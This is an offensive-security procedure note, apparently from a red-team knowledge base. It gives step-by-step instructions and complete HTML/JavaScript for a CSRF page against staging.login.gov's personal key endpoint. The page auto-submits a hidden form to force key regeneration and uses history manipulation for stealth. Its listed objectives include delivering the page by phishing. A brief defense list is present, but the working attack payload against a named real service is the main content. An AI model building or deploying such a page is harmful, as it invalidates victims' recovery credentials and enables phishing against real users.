---
tags:
  - csrf
  - html
  - javascript
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:16.042Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 3ecd80bd-8424-4e84-bde0-d003ef08dbe1
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-HTML-Page-for-CSRF-Attack

## Summary

This procedure details creating a malicious HTML page that auto-submits a form to the vulnerable personal key endpoint on staging.login.gov, exploiting CSRF to force key regeneration without user interaction.

## Description

The crafted page uses a hidden HTML form targeting https://staging.login.gov/manage/personal_key with the 'resend=true' parameter. JavaScript ensures automatic submission upon load, and history.pushState manipulates the browser history to prevent navigation warnings, making the attack stealthy. This targets logged-in users, invalidating their personal key and redirecting them to view the new one, while the old key becomes unusable.

## Requirements

1. Text editor to create HTML/JavaScript file
2. Web server to host the malicious page (e.g., local or remote)
3. Understanding of browser same-origin policy and CSRF mechanics

## Defense

Defensive measures and detection strategies:

- Enforce SameSite=Strict cookies to prevent cross-site requests
- Log and alert on personal key regenerations from suspicious IPs
- Educate users on phishing links and unexpected redirects

## Objectives

1. Build an auto-submitting form that triggers the vulnerable endpoint
2. Ensure stealth by avoiding user-visible actions
3. Prepare the page for delivery via phishing

## Instructions

### Step 1: Create the HTML Form Structure

**Context**: Define the form with the exact action and parameters to mimic legitimate submission.

Write the base HTML:

```html
<!DOCTYPE html>
<html>
<head><title>Loading...</title></head>
<body>
  <form id="csrf-form" action="https://staging.login.gov/manage/personal_key" method="POST" style="display:none;">
    <input type="hidden" name="resend" value="true">
  </form>
</body>
</html>
```

**Expected Output**: A hidden form ready for submission.

### Step 2: Add JavaScript for Auto-Submission and History Manipulation

**Context**: Use JS to submit the form immediately and alter history to mask the action.

Add the script tag before closing body:

```html
  <script>
    document.getElementById('csrf-form').submit();
    history.pushState(null, null, window.location.href);
  </script>
</body>
```

Save and test locally by opening in a browser authenticated to the site.

**Expected Output**: Form submits automatically, user redirected to target site with new key displayed.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[JavaScript]]
- [[phishing-delivery]]
